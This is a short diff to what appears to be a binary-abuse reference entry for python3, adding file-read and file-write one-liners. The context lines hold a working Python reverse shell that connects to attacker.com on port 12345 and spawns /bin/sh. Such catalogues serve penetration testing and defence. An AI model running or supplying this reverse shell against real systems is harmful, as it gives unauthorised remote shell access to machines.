@@ -28,6 +28,10 @@ functions:
         export RHOST=attacker.com
         export RPORT=12345
         python3 -c 'import sys,socket,os,pty;s=socket.socket(); s.connect((os.getenv("RHOST"),int(os.getenv("RPORT")))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn("/bin/sh")'
+  file-read:
+    - code: python3 -c 'open("file_to_read").read()'
+  file-write:
+    - code: python3 -c 'open("file_to_write","w+").write("data")'
   load-library:
     - code: python3 -c 'from ctypes import cdll; cdll.LoadLibrary("lib.so")'
 ---
